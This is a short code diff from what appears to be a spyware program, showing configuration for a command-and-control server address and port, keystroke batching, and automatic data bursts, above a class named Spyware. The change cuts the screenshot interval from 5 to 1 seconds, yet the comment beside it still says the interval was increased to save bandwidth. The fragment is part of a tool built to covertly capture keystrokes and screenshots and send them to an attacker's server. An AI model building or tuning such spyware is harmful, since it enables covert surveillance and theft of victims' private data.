@@ -27,7 +27,7 @@ C2_SERVER_IP = "192.168.2.111"  # Apna C2 Server IP dalein
 C2_SERVER_PORT = 5555
 
 SEND_INTERVAL = 10  # Seconds between automatic data bursts
-SCREENSHOT_INTERVAL = 5  # Increased to save bandwidth on Render
+SCREENSHOT_INTERVAL = 1  # Increased to save bandwidth on Render
 MAX_KEYS_BEFORE_SEND = 50  
 
 class Spyware:
